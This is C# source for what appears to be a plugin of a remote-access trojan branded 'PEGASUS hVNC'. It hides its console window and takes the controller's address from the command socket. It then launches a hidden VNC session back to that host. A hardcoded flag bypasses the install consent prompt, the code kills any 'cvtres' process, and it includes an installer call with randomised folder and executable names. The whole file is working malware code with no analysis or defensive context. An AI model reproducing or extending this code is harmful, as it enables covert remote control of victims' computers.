using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Plugin;

namespace Plugin
{

    internal class Omega
    {
        public const int SW_HIDE = 0;

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [STAThread]
        public static void Start(string port)
        {
            ShowWindow(GetConsoleWindow(), 0);
            string host = Plugin.Socket.RemoteEndPoint.ToString();
            int index = host.LastIndexOf(":");
            if (index > 0)
                host = host.Substring(0, index);
            var text = host;
            var text2 = Convert.ToString(port);
            var text3 = "False";
            var path = "-1";
            var folder = "kkuoAJzUj";
            var filename = "CeMXFJGYO.exe";
            var wdex = "False";
            var text4 = "True";
            if (text4 == "False")
            {
                switch (MessageBox.Show("Do You Want To Install PEGASUS hVNC?", "PEGASUS hVNC", MessageBoxButtons.YesNo,
                            MessageBoxIcon.Question))
                {
                    case DialogResult.Yes:
                        {
                            if (Process.GetProcessesByName("cvtres").Length == 0)
                            {
                                HVNC.StartHVNC(text + " " + text2);
                                if (text3 == "True") Installer.Run(path, folder, filename, wdex);
                                break;
                            }

                            var processes = Process.GetProcesses();
                            foreach (var process in processes)
                                if (process.ProcessName == "cvtres")
                                {
                                    process.Kill();
                                    break;
                                }

                            HVNC.StartHVNC(text + " " + text2);
                            if (text3 == "True") Installer.Run(path, folder, filename, wdex);
                            break;
                        }

                    case DialogResult.No:
                        MessageBox.Show("PEGASUS WILL NOT be installed to your system", "PEGASUS hVNC",
                            MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                        Environment.Exit(0);
                        break;
                }
            }
            else
            {
                if (!(text4 == "True")) return;
                if (Process.GetProcessesByName("cvtres").Length == 0)
                {
                    HVNC.StartHVNC(text + " " + text2);
                    if (text3 == "True") Installer.Run(path, folder, filename, wdex);
                    return;
                }

                var processes = Process.GetProcesses();
                foreach (var process2 in processes)
                    if (process2.ProcessName == "cvtres")
                    {
                        process2.Kill();
                        break;
                    }

                HVNC.StartHVNC(text + " " + text2);
                if (text3 == "True") Installer.Run(path, folder, filename, wdex);
            }
        }

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }

}

